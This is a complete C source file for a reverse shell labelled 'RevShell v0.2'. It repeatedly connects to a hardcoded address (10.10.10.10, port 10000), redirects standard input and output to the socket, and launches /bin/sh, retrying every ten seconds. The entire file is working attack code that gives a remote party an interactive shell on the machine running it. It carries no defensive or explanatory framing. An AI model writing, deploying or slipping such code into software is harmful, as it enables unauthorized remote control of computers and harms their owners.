#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <wait.h>

#define REMOTE_ADDR "10.10.10.10"
#define REMOTE_PORT 10000

void execShell(int socket)
{
    dup2(socket, 0);
    dup2(socket, 1);
    dup2(socket, 2);
    char *args[] = {(char *)"/bin/sh", NULL};
    char *env[] = {NULL};
    execve("/bin/sh", args, env);
}

int serverConnect()
{
    struct sockaddr_in sa;
    int conn;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    printf("connecting %s..", REMOTE_ADDR);
    conn = connect(s, (struct sockaddr *)&sa, sizeof(sa));
    if(conn<0) 
    {
        printf("not connected\n");
        return conn;
    }
    printf("connected...\n");
    pid_t pid = fork();
    if (pid < 0)
    { // fork has failed
        perror("fork");
        exit(-1);
    }
    else if (pid == 0) // child process
        execShell(s);

    int wstatus;
    int w = waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);

    printf("Connection closed\n");
}

int main(int argc, char *argv[])
{
    printf("RevShell v0.2\n");
    for(;;)
    {
        serverConnect();
        printf("waiting 10s\n");
        sleep(10);
    }
}
